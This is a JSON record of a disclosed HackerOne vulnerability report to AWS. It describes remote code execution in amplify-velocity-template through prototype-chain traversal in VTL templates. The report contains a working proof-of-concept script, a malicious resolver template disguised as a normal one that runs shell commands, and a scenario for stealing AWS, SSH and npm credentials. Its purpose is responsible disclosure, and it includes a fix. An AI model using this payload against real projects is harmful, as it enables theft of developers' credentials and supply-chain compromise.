@@ -1,0 +1,122 @@
+{
+  "id": 3897236,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODk3MjM2",
+  "url": "https://hackerone.com/reports/3897236",
+  "title": "RCE in AWS Amplify CLI via Prototype Chain Traversal in amplify-velocity-template",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-28T18:55:09.182Z",
+  "submitted_at": "2026-07-28T18:55:09.669Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "matty69v",
+    "url": "/matty69v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d9drin7bro3d44gr64nbpghu6pik/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 84809,
+    "url": "https://hackerone.com/aws_vdp",
+    "handle": "aws_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/e68529859b080f77ebfd9e0a1acafdf062bd4c43f1db58e7e55c81e6ceae2d0d"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "AWS VDP",
+      "twitter_handle": "amazon",
+      "website": "https://aws.amazon.com/",
+      "about": "Amazon Web Services (AWS) is a secure cloud services platform, offering compute power and other functionality to help businesses scale and grow. "
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-13T17:25:07.185Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-13T16:44:52.267Z",
+  "team_member_agreed_on_going_public_at": "2026-10-13T17:25:06.949Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\n`amplify-velocity-template` (npm, published by Amazon) is a fork of `velocityjs` used by `@aws-amplify/amplify-appsync-simulator` to render VTL resolver templates during `amplify mock api`. The fork never backported any prototype-chain guards from upstream. Property resolution does raw `baseRef[id]` with zero filtering, so an attacker who controls a `.vtl` file can reach the `Function` constructor and execute arbitrary OS commands.\n\n## Steps to reproduce\n\nRun these commands on any machine with Node.js installed:\n\n```bash\nmkdir vtl-rce && cd vtl-rce && npm init -y\nnpm install amplify-velocity-template@1.4.17 @aws-amplify/amplify-appsync-simulator@2.16.20\n```\n\nCreate a file called `poc.js` with this content:\n\n```js\nconst { VelocityTemplate } = require('@aws-amplify/amplify-appsync-simulator');\nconst fs = require('fs');\n\n// Malicious VTL resolver template -- looks like a normal DynamoDB GetItem mapping\nconst VTL = [\n  '## AppSync Request Mapping -- Query.getUser',\n  '#set($userId = $context.arguments.id)',\n  '#set($x = {})',\n  '#set($log = $x.toString().constructor.constructor.call($x,',\n  '  \"var cp = process.mainModule.require(\\'child_process\\');',\n  '   var r = cp.execSync(\\'id && hostname && uname -a\\').toString();',\n  '   process.mainModule.require(\\'fs\\').writeFileSync(\\'/tmp/amplify-rce-proof\\', r);',\n  '   return r\"',\n  ').call($x))',\n  '{',\n  '  \"version\": \"2017-02-28\",',\n  '  \"operation\": \"GetItem\",',\n  '  \"key\": { \"id\": { \"S\": \"$userId\" } }',\n  '}',\n].join('\\n');\n\ntry { fs.unlinkSync('/tmp/amplify-rce-proof'); } catch {}\n\n// This is the same code path as `amplify mock api`:\n// AmplifyAppSyncSimulator.init() -> new VelocityTemplate(content)\nvar vtl = new VelocityTemplate(\n  { content: VTL, path: 'resolvers/Query.getUser.req.vtl' },\n  { appSyncConfig: { defaultAuthenticationType: { authenticationType: 'API_KEY' } } },\n);\n\n// Build a real GraphQL AST node using the simulator's own graphql module\nvar graphql = require(require.resolve('graphql', {\n  paths: [require.resolve('@aws-amplify/amplify-appsync-simulator')],\n}));\nvar doc = graphql.parse('{ getUser(id: \"user-123\") { id name } }');\nvar fieldNode = doc.definitions[0].selectionSet.selections[0];\n\n// This is the same call as AppSyncUnitResolver.resolve() -> requestTemplate.render()\nconsole.log('[1] Rendering VTL template...');\nvar result = vtl.render(\n  { arguments: { id: 'user-123' }, source: {}, stash: {}, result: null },\n  { requestAuthorizationMode: 'API_KEY', headers: {}, sourceIp: '127.0.0.1' },\n  { fieldName: 'getUser', fieldNodes: [fieldNode], parentType: 'Query', variableValues: {}, fragments: {} },\n);\nconsole.log('[2] Resolver output:', JSON.stringify(result.result));\n\nif (fs.existsSync('/tmp/amplify-rce-proof')) {\n  console.log('[3] RCE CONFIRMED -- /tmp/amplify-rce-proof contents:');\n  console.log(fs.readFileSync('/tmp/amplify-rce-proof', 'utf8'));\n  fs.unlinkSync('/tmp/amplify-rce-proof');\n}\n```\n\nThen run:\n\n```bash\nnode poc.js\n```\n\nYou will see output like this:\n\n```\n[1] Rendering VTL template...\n[2] Resolver output: {\"version\":\"2017-02-28\",\"operation\":\"GetItem\",\"key\":{\"id\":{\"S\":\"user-123\"}}}\n[3] RCE CONFIRMED -- /tmp/amplify-rce-proof contents:\n████████ gid=20(staff) groups=20(staff),12(everyone)...\n████████\nDarwin ████████ 25.5.0 Darwin Kernel Version 25.5.0 ... arm64\n```\n\nThe resolver returned valid DynamoDB JSON. No errors were logged. The `id`, `hostname`, and `uname -a` commands ran silently and wrote their output to `/tmp/amplify-rce-proof`.\n\n## Root cause\n\n`amplify-velocity-template/src/compile/references.js` resolves object properties with no filtering:\n\n```js\n} else if (type === 'property') {\n    ret = baseRef[id];  // no guard -- resolves constructor, __proto__, etc.\n}\n```\n\nUpstream `velocityjs` added a prototype-chain denylist in version 2.1.6. The AWS fork never backported it. Every inherited property is reachable, so the chain `{}.toString().constructor.constructor` reaches the `Function` constructor directly.\n\n## Attack scenario\n\n1. Attacker puts a malicious `.vtl` resolver file in an Amplify project (via PR, fork, or direct push).\n2. Developer clones the repo and runs `amplify mock api`.\n3. Any GraphQL query triggers VTL rendering.\n4. The payload runs `child_process.execSync()` with the developer's privileges.\n5. Attacker steals `~/.aws/credentials`, `~/.ssh/*`, or `~/.npmrc` and exfiltrates them.\n\nThe malicious VTL looks like a normal AppSync resolver. The payload hides in a `#set` variable assignment. The resolver still returns valid JSON, so the developer sees no errors.\n\n## Affected packages\n\n- `amplify-velocity-template` 1.4.17 (latest) -- published by amzn-oss -- 60K downloads/week\n- `@aws-amplify/amplify-appsync-simulator` 2.16.20 (latest) -- 35K downloads/week\n- `@aws-amplify/cli` (latest) -- 317K downloads/week\n\nSource: https://github.com/aws-amplify/amplify-cli/tree/main/packages/amplify-velocity-template\n\n## Recommended fix\n\nBackport `prototype-guard.ts` from upstream velocityjs 2.1.6 into `amplify-velocity-template`, or replace property resolution with an allowlist in `references.js` (`getAttributes`, `getPropMethod`, `getPropIndex`). Only resolve properties where `Object.prototype.hasOwnProperty.call(baseRef, key)` is true, or where `key` is on an explicit allowlist of safe built-in methods.\n\n## Impact\n\n- **AWS credential theft**: developers using Amplify always have AWS credentials configured (`~/.aws/credentials` or environment variables). Stolen credentials give the attacker access to the victim's AWS account.\n- **SSH key theft**: `~/.ssh/id_rsa` gives access to the victim's GitHub/GitLab repositories and any SSH-accessible infrastructure.\n- **npm token theft**: `~/.npmrc` tokens allow publishing malicious packages under the victim's npm account (supply chain escalation).\n- **Persistent backdoor**: `fs.writeFileSync` can drop a reverse shell, cron job, or modified shell profile.\n- **CI/CD compromise**: if `amplify mock api` runs in CI (e.g., for integration tests), the attacker gets CI credentials and can pivot to production.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 10,
+  "voters": [
+    "n1m0",
+    "anagnorisis2peripeteia",
+    "2026",
+    "matty69v",
+    "researcherlian",
+    "0xkenzo",
+    "raghupathi_321",
+    "d7a_44",
+    "iconic1",
+    "bugchamp"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 741958,
+    "asset_type": "OTHER",
+    "asset_identifier": "AWS Amplify",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
